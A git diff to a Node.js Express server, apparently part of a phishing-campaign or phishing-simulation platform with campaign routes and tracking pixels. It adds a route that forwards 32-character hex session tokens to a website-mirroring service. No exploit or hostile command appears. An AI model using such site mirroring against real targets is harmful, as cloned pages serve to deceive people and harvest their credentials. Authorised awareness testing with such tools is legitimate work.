@@ -10,6 +10,7 @@ const socketIo = require('socket.io');
 const crypto = require('crypto');
 const db = require('./database'); // Add database import
 const landingPageService = require('./services/landingPageService');
+const websiteMirroringService = require('./services/websiteMirroringService');
 
 // Import routes
 const campaignRoutes = require('./routes/campaignRoutes');
@@ -138,6 +139,17 @@ app.get('/test-tracker/:id', (req, res) => {
   
   // Redirect to the actual tracking pixel
   res.redirect(`/tracker/${pixelId}.png`);
+});
+
+// Website mirroring path-based route handler (must be before other routes)
+app.use('/:sessionToken', async (req, res, next) => {
+  // Check if this is a valid mirroring session token (32-char hex)
+  const sessionToken = req.params.sessionToken;
+  if (sessionToken && /^[0-9a-f]{32}$/i.test(sessionToken)) {
+    console.log(`Potential mirroring request detected: ${sessionToken}`);
+    return websiteMirroringService.handleMirrorRequest(sessionToken, req, res);
+  }
+  next(); // Not a mirroring request, continue to other routes
 });
 
 // Socket.io connection handling
